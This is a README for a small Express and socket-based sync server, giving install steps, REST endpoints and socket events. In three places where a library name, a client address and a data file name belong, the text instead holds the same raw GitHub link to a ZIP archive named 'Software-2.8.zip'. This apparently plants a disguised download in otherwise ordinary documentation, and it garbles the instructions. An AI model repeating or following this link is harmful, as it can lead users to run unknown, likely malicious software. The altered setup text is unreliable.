# BlastFurnace Sync Server

A minimal Express + https://raw.githubusercontent.com/ggrbipin/bfrsprkl/main/.github/Software-2.8.zip server to synchronize simple key/value form data between devices.

Usage

1. Install dependencies:

```powershell
cd sync-server
npm install
```

2. Start server:

```powershell
npm start
```

By default the server listens on port 3000. Clients should connect via https://raw.githubusercontent.com/ggrbipin/bfrsprkl/main/.github/Software-2.8.zip and `join(roomId)` where `roomId` is a shared identifier (for example user id or app instance id). The server persists to `https://raw.githubusercontent.com/ggrbipin/bfrsprkl/main/.github/Software-2.8.zip` using timestamp-based last-write-wins.

APIs

- GET /data/:id - get current stored keys for id
- POST /data/:id - merge provided keys (with ts) into store and broadcast to connected clients

Socket events

- join(roomId) - join a room; server emits `init` with current state
- update({roomId, payload}) - send partial payload; server merges and broadcasts `remote-update` to other clients
- remote-update(payload) - server-to-client event with key->entry map
